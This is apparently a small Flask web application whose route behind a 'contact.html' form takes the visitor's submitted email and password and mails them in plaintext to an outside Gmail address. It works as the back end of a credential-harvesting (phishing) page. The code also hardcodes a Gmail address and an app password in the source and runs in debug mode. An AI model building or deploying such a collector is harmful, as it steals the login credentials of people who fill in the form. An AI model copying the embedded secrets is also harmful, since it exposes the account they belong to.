from flask import Flask, render_template, request
import smtplib, ssl

MY_EMAIL = "popww619@gmail.com"
MY_PASSWORD = "vfyuqrhmwxtlsdwb"
app = Flask(__name__)


def send_mail(email, password):
    context = ssl.create_default_context()
    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as connection:
        connection.login(MY_EMAIL, MY_PASSWORD)
        connection.sendmail(MY_EMAIL, "bikram1209@gmail.com",
                            msg=f"Subject:New User\n\nEmail: {email}\nPassword: {password}")


@app.route("/")
def form():
    return render_template("contact.html")


@app.route("/submitted", methods=['POST'])
def submitted():
    send_mail(request.form['email'], request.form['password'])
    return render_template("home.html")


app.run(debug=True)
